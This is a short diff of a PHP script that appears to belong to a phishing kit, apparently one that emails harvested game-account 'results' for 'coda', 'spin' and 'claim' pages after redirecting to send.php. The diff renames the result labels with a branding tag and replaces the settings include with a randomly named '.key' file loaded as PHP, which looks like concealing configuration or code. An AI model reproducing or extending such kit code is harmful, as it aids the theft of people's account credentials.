@@ -6,10 +6,10 @@ $url = $_SERVER['PHP_SELF'];
 header("Location: send.php");
 }
 
-//jenis ress
-$coda = 'RESS ZYY JATIM !!';
-$spin = 'RESS ZYY JATIM !!';
-$claim = 'RESS ZYY JATIM !!';
+//
+$coda = 'RESS ZYY JATIM !!👑RESS | DILHOST | GG👑';
+$spin = 'RESS ZYY JATIM !!👑RESS  | DILHOST | GG👑';
+$claim = 'RESS ZYY JATIM !!👑RESS | DILHOST | GG👑';
 
 //jenis mail
 $coda_mail = 'coda';
@@ -17,7 +17,7 @@ $spin_mail = 'spin';
 $claim_mail = 'claim';
 
 //get setting
-include 'setting.php';
+include '9d536_8115d_6d7d316599dc6d7b4bff1aa912b71bfd.key';
 
 //method get
 $total = '1';
